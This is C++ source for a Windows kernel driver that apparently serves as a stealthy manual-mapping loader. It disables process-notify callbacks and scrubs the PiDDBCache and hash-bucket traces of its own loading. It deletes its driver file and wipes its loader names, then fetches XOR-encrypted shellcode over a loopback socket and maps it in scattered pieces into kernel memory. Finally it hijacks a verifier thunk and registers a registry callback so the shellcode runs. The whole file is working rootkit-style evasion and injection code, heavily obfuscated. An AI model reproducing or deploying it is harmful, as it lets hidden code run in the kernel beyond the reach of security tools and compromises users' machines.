#include <ntifs.h>
#include <minwindef.h>
#include <wsk.h>
#include <cstdint>
#include <intrin.h>

#include "Kli/kli_seed.hpp"
#include "Kli/kli_mba.hpp"
#include "Kli/kli_runtime.hpp"
#include "Kli/kli_crypt.hpp"
#include "Kli/kli_api.hpp"
#include "ClearTraces.hpp"

#include "Utils.hpp"
#include "Wsk.hpp"

#include "UN_LiteMapper.hpp"
#include "ScatteredMapper.hpp"
#include "InitShellCode.hpp"
#include "Api_Dynamic.hpp"

static __forceinline NTSTATUS CleanupAndFail(ULONG64 NT_Base, PMap pMap, PUCHAR shellBuffer, ULONG tag) {
    auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
    if (shellBuffer && _ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(shellBuffer, tag);

    if (pMap && _ExFreePoolWithTag && pMap->System.PhysMemRanges) {
        ULONG64 realPhysRanges = MBA_XOR(ULONG64, pMap->System.PhysMemRanges, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap));
        KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)((PVOID)realPhysRanges, pMap->MEMORY_TAG.Nono);
    }

    auto _MmFreeContiguousMemory = KLI_FN(NT_Base, MmFreeContiguousMemory);
    if (_MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
    return STATUS_DEVICE_NOT_READY;
}

static __forceinline VOID ZeroUnicodeBuffer(PUNICODE_STRING us) {
    if (us->Buffer && us->MaximumLength > 0) {
        volatile UCHAR* p = (volatile UCHAR*)us->Buffer;
        for (USHORT i = 0; i < us->MaximumLength; i++) p[i] = 0;
    }
    us->Length = 0;
}

static __declspec(noinline) NTSTATUS InitializeMapStructure(PMap pMap, ULONG seed) {
    SPOOF_FUNC;

    INT indices[6];
    ULONG localSeed = seed;

    for (INT i = 0; i < 6; i++) indices[i] = i;
    for (INT i = 5; i > 0; i--) {
        INT j = KLI_OBFUSCATE_CALL(KliProtected::seed::mix)(localSeed, static_cast<uint32_t>(i)) % (i + 1);
        localSeed = KLI_OBFUSCATE_CALL(KliProtected::seed::mix)(localSeed, static_cast<uint32_t>(i));
        INT temp = indices[i]; indices[i] = indices[j]; indices[j] = temp;
    }

    for (INT i = 0; i < 6; i++) {
        switch (indices[i]) {
        case 0: pMap->MEMORY_TAG.yKeV = KLI_OBFUSCATE_CALL(GenerateRandomTag)(); break;
        case 1: pMap->MEMORY_TAG.llhS = KLI_OBFUSCATE_CALL(GenerateRandomTag)(); break;
        case 2: pMap->MEMORY_TAG.AlcI = KLI_OBFUSCATE_CALL(GenerateRandomTag)(); break;
        case 3: pMap->MEMORY_TAG.News = KLI_OBFUSCATE_CALL(GenerateRandomTag)(); break;
        case 4: pMap->MEMORY_TAG.TlbN = KLI_OBFUSCATE_CALL(GenerateRandomTag)(); break;
        case 5: pMap->MEMORY_TAG.Nono = KLI_OBFUSCATE_CALL(GenerateRandomTag)(); break;
        }
    }

    return STATUS_SUCCESS;
}

static __declspec(noinline) NTSTATUS InitializeSystemStructures(PMap pMap, ULONG64 NT_Base, PBYTE pNotifyMask, PLDR_DATA_TABLE_ENTRY NtoskrnlLdr) {
    SPOOF_FUNC;

    ULONG64 itKey = KLI_OBFUSCATE_CALL(GetPMapKey)(pMap);

    NTSTATUS initStatus = KLI_OBFUSCATE_CALL(Init)(pMap, NT_Base);
    if (!NT_SUCCESS(initStatus)) return initStatus;

    KLI_OBFUSCATE_CALL(FindMouseClassDevice)(pMap, NT_Base);

    pMap->Notify.PspNotifyEnableMask = (PUCHAR)MBA_XOR(ULONG64, (ULONG64)pNotifyMask, itKey);
    pMap->System.ProtectionOffset = KLI_OBFUSCATE_CALL(GetProtectionOffset)(NT_Base);

    pMap->System.KernelApcDisableOffset = KLI_OBFUSCATE_CALL(GetKernelApcDisableOffset)(NT_Base);
    if (!pMap->System.KernelApcDisableOffset) return STATUS_NOT_FOUND;

    pMap->System.ExitStatusOffset = KLI_OBFUSCATE_CALL(GetExitStatusOffset)(NT_Base);
    if (!pMap->System.ExitStatusOffset) return STATUS_NOT_FOUND;

    ULONG64 realPteBase = MBA_XOR(ULONG64, pMap->System.PteBase, itKey);
    if (!realPteBase) return STATUS_NOT_FOUND;

    auto _MmAllocateMappingAddress = KLI_FN(NT_Base, MmAllocateMappingAddress);
    if (!_MmAllocateMappingAddress) return STATUS_DEVICE_NOT_READY;

    ULONG64 mappedAddr = (ULONG64)KLI_OBFUSCATE_CALL(_MmAllocateMappingAddress)(1024 * PAGE_SIZE, pMap->MEMORY_TAG.Nono);
    if (!mappedAddr) return STATUS_DEVICE_NOT_READY;

    ULONG64 mappedPte = (ULONG64)MiGetSystemPteAddress(mappedAddr);
    ULONG64 realPtes = (ULONG64)MiGetVirtualAddressMappedByPte(realPteBase, mappedPte);
    ULONG64 realPtesPte = (ULONG64)MiGetPteAddress(realPteBase, realPtes);

    pMap->System.Ptes = MBA_XOR(ULONG64, realPtes, itKey);
    pMap->System.PtesPte = MBA_XOR(ULONG64, realPtesPte, itKey);
    pMap->System.NtoskrnlLdr = (PLDR_DATA_TABLE_ENTRY)MBA_XOR(ULONG64, (ULONG64)NtoskrnlLdr, itKey);

    return STATUS_SUCCESS;
}

static __declspec(noinline) NTSTATUS PrepareShellcodeAndRegister(PMap pMap, ULONG64 NT_Base, PUCHAR shellBuffer, INT shellBufferSize, ULONG64 VerifierThunk, PHYSICAL_ADDRESS MaxPhysicalAddress) {
    SPOOF_FUNC;

    if (shellBufferSize < 9) return KLI_OBFUSCATE_CALL(CleanupAndFail)(NT_Base, pMap, shellBuffer, pMap->MEMORY_TAG.llhS);
    CONST CHAR* xorKey = (CONST CHAR*)shellBuffer;
    PUCHAR shellData = shellBuffer + 8;
    INT shellDataSize = shellBufferSize - 8;
    KLI_OBFUSCATE_CALL(XorDecrypt)(shellData, shellDataSize, xorKey, 8);

    ULONG64 entryPtr = KLI_OBFUSCATE_CALL(MapShellcodeScattered)(NT_Base, pMap, MaxPhysicalAddress, shellData, shellDataSize);
    if (!entryPtr) return KLI_OBFUSCATE_CALL(CleanupAndFail)(NT_Base, pMap, shellBuffer, pMap->MEMORY_TAG.llhS);

    ULONG64 pXdv = VerifierThunk + 0x4;
    ULONG64 deref = pXdv + *(INT*)((UCHAR*)pXdv + 3) + 7;
    _InterlockedExchangePointer((PVOID*)deref, (PVOID)entryPtr);

    auto _CmRegisterCallbackEx = KLI_FN(NT_Base, CmRegisterCallbackEx);
    if (!_CmRegisterCallbackEx) return KLI_OBFUSCATE_CALL(CleanupAndFail)(NT_Base, pMap, shellBuffer, pMap->MEMORY_TAG.llhS);

    LARGE_INTEGER regcookie;
    UNICODE_STRING altitude;

    LARGE_INTEGER altSeed;
    KLI_OBFUSCATE_CALL(GetFastSeed)(&altSeed);
    ULONG altInt = 380000 + (ULONG)(altSeed.QuadPart % 20000);
    ULONG altFrac = (ULONG)((altSeed.QuadPart >> 20) % 10000);

    WCHAR altBuf[11];
    for (INT i = 5; i >= 0; i--) {
        altBuf[i] = (WCHAR)(L'0' + altInt % 10); 
        altInt /= 10;
    }
    altBuf[6] = L'.';
    for (INT i = 9; i >= 7; i--) {
        altBuf[i] = (WCHAR)(L'0' + altFrac % 10);
        altFrac /= 10;
    }
    altBuf[10] = 0;
    KLI_OBFUSCATE_CALL(MyRtlInitUnicodeString)(&altitude, altBuf);

    NTSTATUS Status = KLI_OBFUSCATE_CALL(_CmRegisterCallbackEx)((PEX_CALLBACK_FUNCTION)VerifierThunk, &altitude, &altitude, (PVOID)nullptr, &regcookie, (PVOID)nullptr);
    if (!NT_SUCCESS(Status) && Status != STATUS_FLT_INSTANCE_ALTITUDE_COLLISION) return KLI_OBFUSCATE_CALL(CleanupAndFail)(NT_Base, pMap, shellBuffer, pMap->MEMORY_TAG.llhS);

    auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
    if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(shellBuffer, pMap->MEMORY_TAG.llhS);
    return STATUS_UNSUCCESSFUL;
}

__declspec(noinline) NTSTATUS A00_Entry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    SPOOF_FUNC;

    PLDR_DATA_TABLE_ENTRY NtoskrnlLdr = NULL;
    ULONG64 NT_Base = (ULONG64)FindBase(DriverObject, "ntoskrnl.exe", &NtoskrnlLdr);
    if (!NT_Base) return STATUS_DEVICE_NOT_READY;

    PBYTE pNotifyMask = (PBYTE)KLI_OBFUSCATE_CALL(GetPspNotifyEnableMask)(NT_Base);
    UCHAR savedNotifyMask = 0;
    if (pNotifyMask) {
        savedNotifyMask = *pNotifyMask;
        *pNotifyMask = 0;
    } 

    auto _ExFreePoolWithTag = KLI_FN(NT_Base, ExFreePoolWithTag);
    auto _MmFreeContiguousMemory = KLI_FN(NT_Base, MmFreeContiguousMemory);

    ULONG64 MaxPhysicalAddr = 0;
    PPHYSICAL_MEMORY_RANGE physRanges = NULL;
    ULONG physRangeCount = 0;
    auto _MmGetPhysicalMemoryRanges = KLI_FN(NT_Base, MmGetPhysicalMemoryRanges);
    if (_MmGetPhysicalMemoryRanges) {
        physRanges = KLI_OBFUSCATE_CALL(_MmGetPhysicalMemoryRanges)();
        if (physRanges) {
            for (INT i = 0; physRanges[i].NumberOfBytes.QuadPart != 0; i++) {
                ULONG64 end = physRanges[i].BaseAddress.QuadPart + physRanges[i].NumberOfBytes.QuadPart;
                if (end > MaxPhysicalAddr) MaxPhysicalAddr = end;
                physRangeCount++;
            }
        }
    }
    if (!MaxPhysicalAddr || !physRangeCount) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (physRanges && _ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(physRanges, (ULONG)0);
        return STATUS_DEVICE_NOT_READY;
    }

    PHYSICAL_ADDRESS MaxPhysicalAddress;
    MaxPhysicalAddress.QuadPart = MaxPhysicalAddr;

    LARGE_INTEGER seedValue;
    KLI_OBFUSCATE_CALL(GetFastSeed)(&seedValue);
    ULONG seed = MBA_XOR(ULONG, seedValue.LowPart, seedValue.HighPart);

    auto _MmAllocateContiguousMemory = KLI_FN(NT_Base, MmAllocateContiguousMemory);
    if (!_MmAllocateContiguousMemory) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(physRanges, (ULONG)0);
        return STATUS_DEVICE_NOT_READY;
    }

    PMap pMap = (PMap)KLI_OBFUSCATE_CALL(_MmAllocateContiguousMemory)(sizeof(Map), MaxPhysicalAddress);
    if (!pMap) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(physRanges, (ULONG)0);
        return STATUS_DEVICE_NOT_READY;
    }
    __stosq((PULONG64)pMap, 0, (sizeof(Map) + sizeof(ULONG64) - 1) / sizeof(ULONG64));

    KLI_OBFUSCATE_CALL(InitializeMapStructure)(pMap, seed);

    auto _ExAllocatePoolWithTag = KLI_FN(NT_Base, ExAllocatePoolWithTag);
    if (!_ExAllocatePoolWithTag) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(physRanges, (ULONG)0);
        if (_MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return STATUS_DEVICE_NOT_READY;
    }
    SIZE_T physRangesBytes = (physRangeCount + 1) * sizeof(PHYSICAL_MEMORY_RANGE);
    PPHYSICAL_MEMORY_RANGE physRangesCopy = (PPHYSICAL_MEMORY_RANGE)KLI_OBFUSCATE_CALL(_ExAllocatePoolWithTag)(NonPagedPoolNx, physRangesBytes, pMap->MEMORY_TAG.Nono);
    if (!physRangesCopy) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(physRanges, (ULONG)0);
        if (_MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    __movsq((PULONG64)physRangesCopy, (CONST PULONG64)physRanges, physRangesBytes / sizeof(ULONG64));
    if (_ExFreePoolWithTag) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)(physRanges, (ULONG)0);

    pMap->System.PhysMemRanges = MBA_XOR(ULONG64, (ULONG64)physRangesCopy, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap));
    pMap->System.PhysMemRangeCount = physRangeCount;

    PLDR_DATA_TABLE_ENTRY ldrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (ldrEntry->BaseDllName.Buffer && ldrEntry->BaseDllName.Length > 0) {
        KLI_OBFUSCATE_CALL(ClearPiDDBCache)(NT_Base, ldrEntry->BaseDllName);
        KLI_OBFUSCATE_CALL(ClearHashBucket)(DriverObject, NT_Base, ldrEntry->BaseDllName);
    }

    KLI_OBFUSCATE_CALL(DeleteDriverFile)(NT_Base, &ldrEntry->FullDllName);
    KLI_OBFUSCATE_CALL(ZeroUnicodeBuffer)(&ldrEntry->BaseDllName);
    KLI_OBFUSCATE_CALL(ZeroUnicodeBuffer)(&ldrEntry->FullDllName);

    ULONG64 VerifierThunk = KLI_OBFUSCATE_CALL(LocateVerifierThunk)(NT_Base, NtoskrnlLdr->SizeOfImage);
    if (!VerifierThunk) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag && pMap->System.PhysMemRanges) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)((PVOID)MBA_XOR(ULONG64, pMap->System.PhysMemRanges, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap)), pMap->MEMORY_TAG.Nono);
        if (pMap && _MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return STATUS_NOT_FOUND;
    }

    if (!KLI_OBFUSCATE_CALL(GetApiAddress)(pMap, seed, NT_Base)) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag && pMap->System.PhysMemRanges) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)((PVOID)MBA_XOR(ULONG64, pMap->System.PhysMemRanges, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap)), pMap->MEMORY_TAG.Nono);
        if (pMap && _MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return STATUS_DEVICE_NOT_READY;
    }

    NTSTATUS Status = KLI_OBFUSCATE_CALL(InitializeSystemStructures)(pMap, NT_Base, pNotifyMask, NtoskrnlLdr);
    if (!NT_SUCCESS(Status)) {
        if (pNotifyMask) *pNotifyMask = savedNotifyMask;
        if (_ExFreePoolWithTag && pMap->System.PhysMemRanges) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)((PVOID)MBA_XOR(ULONG64, pMap->System.PhysMemRanges, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap)), pMap->MEMORY_TAG.Nono);
        if (pMap && _MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return Status;
    }

    if (pNotifyMask) *pNotifyMask = savedNotifyMask;

    ULONG64 Netio_Base = (ULONG64)FindBase(DriverObject, "NETIO.SYS", nullptr);
    if (!Netio_Base) {
        if (_ExFreePoolWithTag && pMap->System.PhysMemRanges) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)((PVOID)MBA_XOR(ULONG64, pMap->System.PhysMemRanges, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap)), pMap->MEMORY_TAG.Nono);
        if (pMap && _MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return STATUS_DEVICE_NOT_READY;
    }

    PUCHAR shellBuffer = NULL;
    INT shellBufferSize = 0;
    Status = KLI_OBFUSCATE_CALL(RequestShellcodeOverLoopback)(pMap, NT_Base, Netio_Base, &shellBuffer, &shellBufferSize);
    if (!NT_SUCCESS(Status)) {
        if (_ExFreePoolWithTag && pMap->System.PhysMemRanges) KLI_OBFUSCATE_CALL(_ExFreePoolWithTag)((PVOID)MBA_XOR(ULONG64, pMap->System.PhysMemRanges, KLI_OBFUSCATE_CALL(GetPMapKey)(pMap)), pMap->MEMORY_TAG.Nono);
        if (pMap && _MmFreeContiguousMemory) KLI_OBFUSCATE_CALL(_MmFreeContiguousMemory)(pMap);
        return Status;
    }

    return KLI_OBFUSCATE_CALL(PrepareShellcodeAndRegister)(pMap, NT_Base, shellBuffer, shellBufferSize, VerifierThunk, MaxPhysicalAddress);
}